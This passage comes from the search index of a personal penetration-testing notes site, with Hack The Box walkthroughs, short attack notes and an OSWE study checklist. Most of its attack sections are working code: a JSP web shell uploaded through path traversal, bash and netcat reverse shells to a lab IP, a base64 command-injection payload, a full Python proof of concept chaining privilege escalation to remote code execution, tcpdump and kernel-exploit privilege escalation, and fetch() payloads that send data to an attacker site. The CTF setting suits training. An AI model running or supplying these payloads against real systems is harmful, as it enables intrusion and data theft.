image/jpeg\n\n\u00ff\u00d8\u00ff\u00e0\n&lt;%@ page import=\"java.io.*, java.util.*, java.net.*\" %&gt;\n&lt;%\n    String action = request.getParameter(\"action\");\n    String output = \"\";\n\n    try {\n        if (\"cmd\".equals(action)) {\n            // Execute system commands\n            String cmd = request.getParameter(\"cmd\");\n            if (cmd != null) {\n                Process p = Runtime.getRuntime().exec(cmd);\n                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    output += line + \"\\n\";\n                }\n                reader.close();\n            }\n        } else if (\"upload\".equals(action)) {\n            // File upload\n            String filePath = request.getParameter(\"path\");\n            String fileContent = request.getParameter(\"content\");\n            if (filePath != null &amp;&amp; fileContent != null) {\n                File file = new File(filePath);\n                try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) {\n                    writer.write(fileContent);\n                }\n                output = \"File uploaded to: \" + filePath;\n            } else {\n                output = \"Invalid file upload parameters.\";\n            }\n        } else if (\"list\".equals(action)) {\n            // List directory contents\n            String dirPath = request.getParameter(\"path\");\n            if (dirPath != null) {\n                File dir = new File(dirPath);\n                if (dir.isDirectory()) {\n                    for (File file : Objects.requireNonNull(dir.listFiles())) {\n                        output += file.getName() + (file.isDirectory() ? \"/\" : \"\") + \"\\n\";\n                    }\n                } else {\n                    output = \"Path is not a directory.\";\n                }\n            } else {\n                output = \"No directory path provided.\";\n            }\n        } else if (\"delete\".equals(action)) {\n            // Delete files\n            String filePath = request.getParameter(\"path\");\n            if (filePath != null) {\n                File file = new File(filePath);\n                if (file.delete()) {\n                    output = \"File deleted: \" + filePath;\n                } else {\n                    output = \"Failed to delete file: \" + filePath;\n                }\n            } else {\n                output = \"No file path provided.\";\n            }\n        } else {\n            // Unknown operation\n            output = \"Unknown action: \" + action;\n        }\n    } catch (Exception e) {\n        output = \"Error: \" + e.getMessage();\n    }\n\n    // Return the result\n    response.setContentType(\"text/plain\");\n    out.print(output);\n%&gt;\n------WebKitFormBoundarycLZsu5h63A9JgavD\nContent-Disposition: form-data; name=\"top.UploadFileName\"\n\n../../shell.jsp\n------WebKitFormBoundarycLZsu5h63A9JgavD--\n</code></pre> <p></p> <p>original is 'upload' lowercase</p> <p></p> <pre><code>echo -ne '#!/bin/bash\\nbash -c \"bash -i &gt;&amp; /dev/tcp/10.10.15.103/4445 0&gt;&amp;1\"' &gt; bash.sh\n\npython3 -m http.server 80\n\nhttp://strutted.htb/shell.jsp?action=cmd&amp;cmd=wget+10.10.15.103/bash.sh+-O+/tmp/bash.sh\n\nhttp://strutted.htb/shell.jsp?action=cmd&amp;cmd=chmod+777+/tmp/bash.sh\n\nhttp://strutted.htb/shell.jsp?action=cmd&amp;cmd=/tmp/bash.sh\n</code></pre>"}, {"location": "HTB/Machines/Strutted/#james", "title": "James", "text": "<pre><code># /var/lib/tomcat9/conf/tomcat-users.xml\n\n.......\n&lt;!--\n  &lt;user username=\"admin\" password=\"&lt;must-be-changed&gt;\" roles=\"manager-gui\"/&gt;\n  &lt;user username=\"robot\" password=\"&lt;must-be-changed&gt;\" roles=\"manager-script\"/&gt;\n  &lt;role rolename=\"manager-gui\"/&gt;\n  &lt;role rolename=\"admin-gui\"/&gt;\n  &lt;user username=\"admin\" password=\"IT14d6SSP81k\" roles=\"manager-gui,admin-gui\"/&gt;\n---&gt;\n......\n</code></pre> <p>The password works when used for SSH login</p> <p></p> <pre><code>$ sudo -l\nMatching Defaults entries for james on localhost:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser james may run the following commands on localhost:\n    (ALL) NOPASSWD: /usr/sbin/tcpdump\n\nCOMMAND='cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf'\nTF=$(mktemp)\necho \"$COMMAND\" &gt; $TF\nchmod +x $TF\nsudo /usr/sbin/tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\n\n$ /tmp/0xdf -p\n</code></pre> <p><code>-l</code> - Make STDOUT line buffered. It seems like perhaps the output might come to STDOUT, but I didn\u2019t get that.</p> <p><code>-n</code> - Don\u2019t convert addresses to names.</p> <p><code>-i lo</code> - Capture on the localhost interface.</p> <p><code>-w /dev/null</code> - Save capture to <code>/dev/null</code> (throw it away).</p> <p><code>-W 1 -G 1</code> - Used in conjunction with the -G option, this will limit the number of rotated dump files that get created, exiting with status 0 when reaching the limit.\u201d So rotate every second and exit after one file.</p> <p><code>-z $TF</code> - Run the <code>$TF</code> script on rotation.</p> <p><code>-Z root</code> - Run as the root user.</p> <p>https://gtfobins.github.io/gtfobins/tcpdump/</p> <p></p>"}, {"location": "HTB/Machines/TwoMillion/", "title": "TwoMillion", "text": ""}, {"location": "HTB/Machines/TwoMillion/#port-scan", "title": "Port scan", "text": "<pre><code>$ sudo nmap 2million.htb -p- --min-rate=10000 -T4 -sCV\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)\n|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)\n80/tcp open  http    nginx\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-trane-info: Problem with XML parsing of /evox/about\n|_http-title: Hack The Box :: Penetration Testing Labs\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>"}, {"location": "HTB/Machines/TwoMillion/#web-app", "title": "Web APP", "text": "<pre><code>$ gobuster dir -u http://2million.htb/ -w /usr/share/wordlists/dirb/common.txt --exclude-length 162\n\n</code></pre> <p>http://2million.htb/invite</p> <p></p> <p>/js/inviteapi.min.js</p> <pre><code>eval(function(p,a,c,k,e,d){\n    e=function(c){\n        return c.toString(36)\n        };\n        if(!''.replace(/^/,String)){\n            while(c--){\n                d[c.toString(a)]=k[c]||c.toString(a)\n                }\n                k=[function(e){\n                    return d[e]\n                    }];\n                    e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('1 i(4){h 8={\"4\":4};$.9({a:\"7\",5:\"6\",g:8,b:\\'/d/e/n\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:\"7\",5:\"6\",b:\\'/d/e/k/l/m\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))\n</code></pre> <p>The code defines two main functions:</p> <p><code>verifyInviteCode(code)</code> - Sends a POST request to <code>/api/v1/invite/verify</code> with a code</p> <p><code>makeInviteCode()</code> - Sends a POST request to <code>/api/v1/invite/how/to/generate</code></p> <p></p> <p></p> <pre><code>In order to generate the invite code, make a POST request to \\/api\\/v1\\/invite\\/generate\n</code></pre> <p></p> <p></p> <p></p> <p><code>GET /api/v1</code></p> <pre><code>{\n    \"v1\":{\n        \"user\":{\n            \"GET\":{\n                \"\\/api\\/v1\":\"Route List\",\n                \"\\/api\\/v1\\/invite\\/how\\/to\\/generate\":\"Instructions on invite code generation\",\n                \"\\/api\\/v1\\/invite\\/generate\":\"Generate invite code\",\n                \"\\/api\\/v1\\/invite\\/verify\":\"Verify invite code\",\n                \"\\/api\\/v1\\/user\\/auth\":\"Check if user is authenticated\",\n                \"\\/api\\/v1\\/user\\/vpn\\/generate\":\"Generate a new VPN configuration\",\n                \"\\/api\\/v1\\/user\\/vpn\\/regenerate\":\"Regenerate VPN configuration\",\n                \"\\/api\\/v1\\/user\\/vpn\\/download\":\"Download OVPN file\"\n                },\n            \"POST\":{\n                \"\\/api\\/v1\\/user\\/register\":\"Register a new user\",\n                \"\\/api\\/v1\\/user\\/login\":\"Login with existing user\"\n            },\n        \"admin\":{\n            \"GET\":{\n                \"\\/api\\/v1\\/admin\\/auth\":\"Check if user is admin\"\n                },\n            \"POST\":{\n                \"\\/api\\/v1\\/admin\\/vpn\\/generate\":\"Generate VPN for specific user\"\n                },\n            \"PUT\":{\n                \"\\/api\\/v1\\/admin\\/settings\\/update\":\"Update user settings\"\n                }\n            }\n        }\n    }\n}\n</code></pre> <p></p> <p>add <code>Content-Type: application/json</code> to avoid \"Invalid content type.\" error.</p> <p></p> <p></p> <p></p> <p></p> <pre><code>bash -i &gt;&amp; /dev/tcp/10.10.15.103/4445 0&gt;&amp;1\n\nPOST /api/v1/admin/vpn/generate HTTP/1.1\nHost: 2million.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\nReferer: http://2million.htb/home/access\nCookie: PHPSESSID=fn9jmkud82uk5igt5stoi6am6k\nContent-Type: application/json\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\nContent-Length: 27\n\n{\n\"username\":\"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMDMvNDQ0NSAwPiYx | base64 -d | bash;\"\n}\n</code></pre> <p></p> <pre><code>www-data@2million:~/html$ cat .env\ncat .env\nDB_HOST=127.0.0.1\nDB_DATABASE=htb_prod\nDB_USERNAME=admin\nDB_PASSWORD=SuperDuperPass123\n</code></pre>"}, {"location": "HTB/Machines/TwoMillion/#user-admin", "title": "User Admin", "text": "<pre><code>$ ssh admin@2million.htb\n\nadmin@2million:/var/mail$ cat admin\nFrom: ch4p &lt;ch4p@2million.htb&gt;\nTo: admin &lt;admin@2million.htb&gt;\nCc: g0blin &lt;g0blin@2million.htb&gt;\nSubject: Urgent: Patch System OS\nDate: Tue, 1 June 2023 10:45:22 -0700\nMessage-ID: &lt;9876543210@2million.htb&gt;\nX-Mailer: ThunderMail Pro 5.2\n\nHey admin,\n\nI'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.\n\nHTB Godfather\n</code></pre> <p>OverlayFS exploit</p> <p>CVE-2023-0386 | GitHub</p> <pre><code>git clone https://github.com/xkaneiki/CVE-2023-0386\n\nzip -r cve.zip CVE-2023-0386\n\nscp cve.zip admin@2million.htb:/tmp\n\ncd /tmp\nunzip cve.zip\n\ncd /tmp/CVE-2023-0386/\n# ignore warnings\nmake all\n\n# Start two terminals and in the first one type\n./fuse ./ovlcap/lower ./gc &amp;\n\n# second one\n$ ./exp\n</code></pre> <p></p> <p><code>&amp;</code>: run in the background</p>"}, {"location": "HTB/Machines/TwoMillion/#all-in-one-to-rce-poc", "title": "ALL in one to RCE POC", "text": "<pre><code>import argparse, base64\nimport requests\n\nproxies = {\n    \"http\": \"http://127.0.0.1:8080\",\n    \"https\": \"http://127.0.0.1:8080\"\n}\n\ndef generate_invite_code(target, session):\n    url = f\"http://{target}/api/v1/invite/generate\"\n\n    response = session.post(url, proxies=proxies, verify=False, allow_redirects=False)\n\n    if response.status_code == 200 and response.json()[\"success\"] == 1:\n        data = response.json()[\"data\"]\n        encoded_code = data[\"code\"]\n        code = base64.b64decode(encoded_code).decode('utf-8')\n        print(\"invite code is \", code)\n        return code\n    print(\"Generate invite code failed.\", response.text)\n\ndef register_user(target, code, session):\n    url = f\"http://{target}/api/v1/user/register\"\n    data = {\"code\":code, \"username\":\"test\", \"email\": \"test@htb.com\", \"password\": \"test1234\", \"password_confirmation\":\"test1234\"}\n\n    response = session.post(url, data=data, proxies=proxies, verify=False, allow_redirects=False)\n    if response.status_code == 302:\n        print(\"Register user test succeed. test@htb.com:test1234\")\n    else:\n        print(\"Register user failed.\")\n\ndef user_login(target, session):\n    url = f\"http://{target}/api/v1/user/login\"\n    data = {\"email\":\"test@htb.com\", \"password\":\"test1234\"}\n    response = session.post(url, data=data, proxies=proxies, verify=False, allow_redirects=False)\n    if response.status_code == 302:\n        print(\"Login user test succeed.\")\n    else:\n        print(\"Login user failed.\")\n\ndef update_user_to_admin(target, session):\n    url = f\"http://{target}/api/v1/admin/settings/update\"\n    data = {\n        \"email\":\"test@htb.com\",\n        \"is_admin\":1\n        }\n    headers = {\"Content-Type\": \"application/json\"}\n    response = session.put(url, json=data, headers=headers, proxies=proxies, verify=False, allow_redirects=False)\n    if response.status_code == 200 and response.json()[\"is_admin\"] == 1:\n        print(\"Update user test to admin succeed.\")\n    else:\n        print(\"Update user test to admin failed.\")\n\ndef verify_user_is_admin(target, session):\n    url = f\"http://{target}/api/v1/admin/auth\"\n    response = session.get(url, proxies=proxies, verify=False, allow_redirects=False)\n    if response.status_code == 200 and response.json()[\"message\"] is True:\n        print(\"Verify user test is an admin user\")\n    else:\n        print(\"Verify user test is not an admin user\")\n\ndef rce(target, session, lhost, lport):\n    url = f\"http://{target}/api/v1/admin/vpn/generate\"\n    payload = f\"bash -i &gt;&amp; /dev/tcp/{lhost}/{lport} 0&gt;&amp;1\"\n    encoded_payload= base64.b64encode(payload.encode('utf-8')).decode('utf-8')\n    print(\"Encoded payload is \", encoded_payload)\n    data = {\n        \"username\": f\"test;echo {encoded_payload} | base64 -d | bash;\"\n        }\n    headers = {\"Content-Type\": \"application/json\"}\n    session.post(url, json=data, headers=headers, proxies=proxies, verify=False, allow_redirects=False)\n\nif __name__==\"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"-t\", \"--target\", help=\"Target web server IP:PORT\", required=True)\n    parser.add_argument(\"-l\", \"--lhost\", help=\"Local listener's IP\", required=True)\n    parser.add_argument(\"-p\", \"--lport\", help=\"Local listener's port\", required=True)\n    args = parser.parse_args()\n\n    session = requests.Session()\n    session.get(url=f\"http://{args.target}/\")\n\n    invite_code = generate_invite_code(args.target, session)\n    if invite_code:\n        register_user(args.target, invite_code, session)\n        user_login(args.target, session)\n        update_user_to_admin(args.target, session)\n        verify_user_is_admin(args.target, session)\n        rce(args.target, session, args.lhost, args.lport)\n</code></pre>"}, {"location": "HTB/Machines/Vault/", "title": "Vault", "text": ""}, {"location": "HTB/Machines/Vault/#port-scan", "title": "Port Scan", "text": "<pre><code>$ sudo nmap 10.129.189.113 -p- --min-rate=10000 -T4 -sCV\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)\n|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)\n|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>"}, {"location": "HTB/Machines/Vault/#web-app", "title": "Web APP", "text": "<p>It shows <code>Sparklays</code>, so I tried it on the browser, and found this: http://10.129.189.113/sparklays/admin.php</p> <pre><code>$ gobuster dir --url http://10.129.189.113/sparklays/ -w /usr/share/seclists/Discovery/Web-Content/common.txt \n\n/.htpasswd            (Status: 403) [Size: 308]\n/.htaccess            (Status: 403) [Size: 308]\n/.hta                 (Status: 403) [Size: 303]\n/admin.php            (Status: 200) [Size: 615]\n/design               (Status: 301) [Size: 327] [--&gt; http://10.129.189.113/sparklays/design/]\n\n$ gobuster dir --url http://10.129.189.113/sparklays/design/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php -t 50\n\n/.html                (Status: 403) [Size: 311]\n/.php                 (Status: 403) [Size: 310]\n/uploads              (Status: 301) [Size: 335] [--&gt; http://10.129.189.113/sparklays/design/uploads/]\n/design.html          (Status: 200) [Size: 72]\n\n</code></pre> <pre><code>$ sqlmap -r login.req --random-agent --level=5 --risk=3 --batch --dbms mysql --dbs\n</code></pre> <p>http://10.129.189.113/sparklays/design/design.html</p> <p></p> <pre><code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.215/4445 0&gt;&amp;1'\n</code></pre> <p></p> <p>in <code>/home/dave/Desktop</code>, I found several interesting files:</p> <p></p>"}, {"location": "HTB/Machines/Vault/#dave", "title": "Dave", "text": "<pre><code>$ cat Servers\nDNS + Configurator - 192.168.122.4\nFirewall - 192.168.122.5\nThe Vault - x\n\n$ ssh dave@10.129.189.113\nDav3therav3123\n\n$ netstat -tunl\n\ntcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN  \n</code></pre> <pre><code>$ nc -zv 192.168.122.1 80\nConnection to 192.168.122.1 80 port [tcp/http] succeeded!\n\n# DNS server\n$ nc -zv 192.168.122.4 80\nConnection to 192.168.122.4 80 port [tcp/http] succeeded!\n$ wget http://192.168.122.4\n</code></pre> <pre><code># port forwarding\n\n$ ssh -L 8081:192.168.122.4:80 dave@10.129.189.113 \n</code></pre> <p>set proxy 127.0.0.1:8081</p> <p></p> <p></p> <pre><code># malicious OpenVPN config file\nremote 192.168.122.1\nifconfig 10.200.0.2 10.200.0.1\ndev tun\nscript-security 2\nup \"/bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.122.1 8181 &gt;/tmp/f'\"\nnobind\n</code></pre> <p>click <code>Test VPN</code>, then we got a shell from the DNS server (192.168.122.4).</p> <p></p> <pre><code>$ cat /home/dave/ssh\ndave\ndav3gerous567\n\n# get root access on the DNS server\n$ sudo su\n</code></pre> <p></p> <pre><code>$ cat /home/alex/.bash_history\n.....\nping 192.168.5.2\nsu root\n......\n\n$ grep -r \"192.168.5.2\" /var/log\nBinary file /var/log/auth.log matches\nBinary file /var/log/btmp matches\n\n$ grep -rHa \"192.168.5.2\" /var/log\n............\n/var/log/auth.log:Sep  2 15:07:51 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f\n/var/log/auth.log:Sep  2 15:10:20 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53\n/var/log/auth.log:Sep  2 15:10:34 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53\n...............\n</code></pre> <p></p> <pre><code>nmap 192.168.5.2 -Pn -f\n</code></pre> <p></p> <pre><code>nmap 192.168.5.2 -Pn -f --source-port=4444\n</code></pre> <p></p> <pre><code>$ /usr/bin/ncat -l 1234 --sh-exec \"ncat 192.168.5.2 987 -p 53\" &amp;\n\n$ ssh dave@localhost -p 1234\n</code></pre> <p></p> <p></p> <p>Escape rbash</p> <pre><code>$ /usr/bin/ncat -l 1234 --sh-exec \"ncat 192.168.5.2 987 -p 53\" &amp;\n\n$ ssh dave@localhost -p 1234 -t bash\n\n# in dave's home folder, there is file called root.txt.gpg\n$ gpg -d root.txt.gpg\n\ngpg: encrypted with RSA key, ID D1EB1F03\ngpg: decryption failed: secret key not available\n\n</code></pre> <p>Before we found a key in the ubuntu host (192.168.122.1), and the file called <code>key</code> in <code>/home/dave/Desktop</code>.</p> <pre><code># on Vault\n$ base32 -w0 root.txt.gpg \n\n# on Ubuntu\n$ echo QUBAYA6HPDD..... | base32 -d &gt; a.gpg\n\n$ gpg -d a.gpg\nitscominghome\n</code></pre> <p></p>"}, {"location": "Notes/Change%20Mysql%20pw%20in%20Linux/", "title": "Change root user's password in Mysql Linux", "text": "<p>If you can use <code>sudo mysql -u root -p</code> to log into your mysql service, but when you use <code>mysql -u root -p</code>, it shows an error like <code>ERROR 1698 (28000): Access denied for user 'root'@'localhost'</code>. This means you haven't setup the password for user root in mysql (not the machine user), which you can use the following commands to check:</p> <ol> <li><code>sudo mysql -u root -p</code> enter your password for your sudo user</li> <li>In mysql connection, enter command <code>use mysql</code></li> <li><code>select * from user;</code></li> </ol> <p>If you see the password column of root user is invalid, you can use the following command to set password for the root user.</p> <pre><code>\u2514\u2500$ sudo mysql -u root -p \nEnter password: \nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 31\nServer version: 10.11.6-MariaDB-2 Debian n/a\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [(none)]&gt; use mysql;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nMariaDB [mysql]&gt; set password for root@localhost=password('&lt;The password you want to use for the root user&gt;');\nQuery OK, 0 rows affected (0.002 sec)\n</code></pre>"}, {"location": "Notes/Create%20multi%20shell/", "title": "Create multiple shells from one shell", "text": "<p>ConPtyShell - Fully Interactive Reverse Shell for Windows</p> <pre><code>Start-Job -ScriptBlock { Get-Process -Name pwsh }\n\n# target\nStart-Job -ScriptBlock { C:\\XXX\\XXX\\ConPtyShell.exe &lt;ip&gt; &lt;port&gt; &lt;tty-rows&gt; &lt;tty-cols&gt; powershell.exe}\n</code></pre> <pre><code># local\n$ stty raw -echo; (stty size; cat) | nc -lvnp 3001\n</code></pre> <p>OR</p> <pre><code># local\n$ stty size\n$ nc -lvnp 3001\nWait For connection\n$ ctrl+z\n$ stty raw -echo; fg[ENTER]\n</code></pre>"}, {"location": "Notes/File%20upload/", "title": "File upload", "text": ""}, {"location": "Notes/File%20upload/#apache2441", "title": "Apache/2.4.41", "text": "<ol> <li> <p>Change the value of the filename parameter to <code>.htaccess</code>.</p> </li> <li> <p>Change the value of the <code>Content-Type</code> header to <code>text/plain</code>.</p> </li> <li> <p>Replace the contents of the file (your PHP payload) with the following Apache directive: </p> </li> </ol> <p><code>AddType application/x-httpd-php .ptest</code> </p> <ol> <li> <p>Change the value of the filename parameter to <code>catch.ptest</code>.</p> </li> <li> <p>Change the value of the <code>Content-Type</code> header to <code>file/ptest</code>.</p> </li> <li> <p>Replace the contents of the file (your PHP payload) as the following: </p> </li> </ol> <p><code>&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;</code></p> <p></p> <p></p> <p>7ZvAWSv1Xdoi9ZncVatq3WqKuBFkYe3Q</p>"}, {"location": "Notes/Transfer%20file%20to%20local/", "title": "Transfer file from remote to local", "text": "<pre><code># local\n$ nc -lvkp 6000 &gt; save.bin\n\n# target\ncmd.exe /c curl -F \"file=@save.exe\" myip:6000\n</code></pre> <p>when it's completed, delete several lines in the head and tail of the bin file.</p>"}, {"location": "Notes/VPN/", "title": "VPN", "text": ""}, {"location": "Notes/payloads%20for%20SSRF/", "title": "payloads for SSRF", "text": ""}, {"location": "Notes/payloads%20for%20SSRF/#write-a-javascript-payload-to-fetch-the-content-of-another-page-then-send-them-to-another-web-server", "title": "Write a javascript payload to fetch the content of another page then send them to another web server", "text": "<pre><code>fetch('http://target-page.com')\n  .then(res =&gt; res.text())\n  .then(data =&gt; fetch('http://your-remote-server.com/collect', {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' },\n    body: JSON.stringify({ data })\n  }));\n</code></pre> <pre><code>fetch(\"/flag\")\n  .then((r) =&gt; r.text())\n  .then((t) =&gt; fetch(`https://attacker_site/?c=${encodeURIComponent(t)}`));\n</code></pre>"}, {"location": "OSWE/Checklist/", "title": "OSWE learning process", "text": ""}, {"location": "OSWE/Checklist/#challenge-labs", "title": "Challenge Labs", "text": "<p>Answers, Chat, DocEdit, Erka, and Sqeakr.</p> <p>The final machine, Sqeakr, is a black box test without any credentials or application source code provided. Of course, if you are able to get a shell on this machine, you can reverse engineer the application to look for other vulnerabilities.</p>"}, {"location": "OSWE/Checklist/#i-have-done-the-following-things-after-the-labs", "title": "I have done the following things after the labs:", "text": "<p>https://github.com/yeswehack/vulnerable-code-snippets</p> <p>https://github.com/bmdyy/order</p> <p>https://github.com/bmdyy/chat.js</p> <p>https://github.com/bmdyy/tudo</p> <p>https://github.com/bmdyy/testr</p> <p>https://github.com/TROUBLE-1/White-box-pentesting</p> <p>https://github.com/takito1812/web-hacking-playground</p> <p>https://pentesterlab.com/badges/codereview (paid)</p> <p>EDIT: Also https://www.vulnhub.com/entry/securecode-1,651 </p> <p>HTB Heal: https://app.hackthebox.com/machines/Heal</p>"}, {"location": "OSWE/Checklist/#tools", "title": "Tools", "text": "Tools Features Burp Suite Web Proxy/Listener dnSpy .NET Code decompilers dotPeek ilSpy JD-GUI Java decompilers"}, {"location": "OSWE/Checklist/#code-review-checklist", "title": "Code Review Checklist", "text": "<ul> <li>[x] Identify Tech Stack: <ul> <li>[x] Programming language? What version, i.e., PHP 5 or 7? </li> <li>[x] Database? </li> <li>[x] Framework?</li> <li>[x] Templating engine?</li> <li>[x] Is it MVC based?</li> <li>[x] What are the communication protocols, does it use websockets?</li> <li>[x] Does it have an API?</li> <li>[x] What Opertating System? find ubuntu version using lsb_release -a</li> </ul> </li> <li>[x] Map the app<ul> <li>[x] Use <code>tree -L 3</code> command, open the app in <code>VSCode</code> or build a sitemap using <code>burp suite</code> to understand the application directory structure</li> <li>[x] What are the routes/pages? If java app search for <code>doPost</code> and <code>doGet</code>. In case of python find routes starting with <code>@</code></li> <li>[x] Is the app MVC based? where are the <code>Models</code>, <code>Views</code> and <code>Controllers</code> located?</li> </ul> </li> <li>[x] Explore the app<ul> <li>[x] Is the application running as root?</li> <li>[x] Which pages don't require authentication? You can prioritise testing them first</li> <li>[x] MVC: Check if some logic breaks the MVC driven pattern, try to search for direct SQL queries within controller</li> </ul> </li> <li>[x] Discover vulnerabilities<ul> <li>[x] What are the interesting functionalities? Password reset, comment section visible to all users, search bar etc</li> <li>[x] SQLi: Find database queries using regex <code>^.*?query.*?select.*?</code></li> <li>[x] SSTI: Find templating engine, you might have a similar line <code>app.set('view engine', 'pug');</code> in <code>app.js</code></li> <li>[x] DOM based XSS: Grep for sinks. REF: https://domgo.at/cxss/sinks </li> <li>[x] Weak random token generator: <code>java.util.random</code> is vulnerable</li> </ul> </li> </ul> <p>Reconnaissance in the background</p> <p>nmapAutomator</p>"}, {"location": "OSWE/Checklist/#brief-syllabus", "title": "Brief syllabus", "text": "<ul> <li> <p>[ ] JavaScript Prototype Pollution</p> </li> <li> <p>[ ] Advanced Server-Side Request Forgery (SSRF)</p> </li> <li> <p>[ ] Web Security Tools and Methodologies</p> </li> <li> <p>[ ] Source Code Analysis</p> </li> <li> <p>[ ] Persistent Cross-Site Scripting</p> </li> <li> <p>[ ] Session Hijacking</p> </li> <li> <p>[ ] .NET Deserialization</p> </li> <li> <p>[ ] Remote Code Execution</p> </li> <li> <p>[ ] Blind SQL Injection</p> </li> <li> <p>[ ] Data Exfiltration</p> </li> </ul>"}, {"location": "OSWE/Checklist/#atutor-authentication-bypass-and-rce", "title": "ATutor Authentication Bypass and RCE", "text": "<ul> <li> <p>[ ] Blind SQL Injections</p> </li> <li> <p>[ ] Bypassing File Upload Restrictions</p> </li> <li> <p>[ ] ...</p> </li> </ul>"}, {"location": "OSWE/Checklist/#atutor-lms-type-juggling-vulnerability", "title": "ATutor LMS Type Juggling Vulnerability", "text": "<ul> <li> <p>[ ] PHP Loose and Strict Comparisons</p> </li> <li> <p>[ ] PHP String Conversion to Numbers</p> </li> <li> <p>[ ] ...</p> </li> </ul>"}, {"location": "OSWE/Checklist/#manageengine-applications-manager-amuserresourcessyn-cservlet-sql-injection-rce", "title": "ManageEngine Applications Manager AMUserResourcesSyn cServlet SQL Injection RCE", "text": "<ul> <li> <p>[ ] PostgreSQL Extensions</p> </li> <li> <p>[ ] ...</p> </li> </ul>"}, {"location": "OSWE/Checklist/#bassmaster-nodejs-arbitrary-javascript-injection-vulnerability", "title": "Bassmaster NodeJS Arbitrary JavaScript Injection Vulnerability", "text": ""}, {"location": "OSWE/Checklist/#dotnetnuke-cookie-deserialization-rce", "title": "DotNetNuke Cookie Deserialization RCE", "text": "<ul> <li>[ ] .Net? Serialization</li> </ul>"}, {"location": "OSWE/Checklist/#erpnext-authentication-bypass-and-server-side-template-injection", "title": "ERPNext Authentication Bypass and Server Side Template Injection", "text": "<ul> <li>[ ] SSTI</li> </ul>"}, {"location": "OSWE/Checklist/#opencrx-authentication-bypass-and-remote-code-execution", "title": "openCRX Authentication Bypass and Remote Code Execution", "text": "<ul> <li>[ ] XML External Entity</li> </ul>"}, {"location": "OSWE/Checklist/#openitcockpit-xss-and-os-command-injection-blackbox", "title": "openITCOCKPIT XSS and OS Command Injection - Blackbox", "text": "<ul> <li>[ ] DOM-based XSS</li> </ul>"}, {"location": "OSWE/Checklist/#concord-authentication-bypass-to-rce", "title": "Concord Authentication Bypass to RCE", "text": "<ul> <li>[ ] CSRF and CORS</li> </ul>"}, {"location": "OSWE/Checklist/#server-side-request-forgery-ssrf", "title": "Server Side Request Forgery (SSRF)", "text": ""}, {"location": "OSWE/Checklist/#guacamole-lite-prototype-pollution", "title": "Guacamole Lite Prototype Pollution", "text": "<ul> <li>[ ] JavaScript Prototype Pollution</li> </ul>"}, {"location": 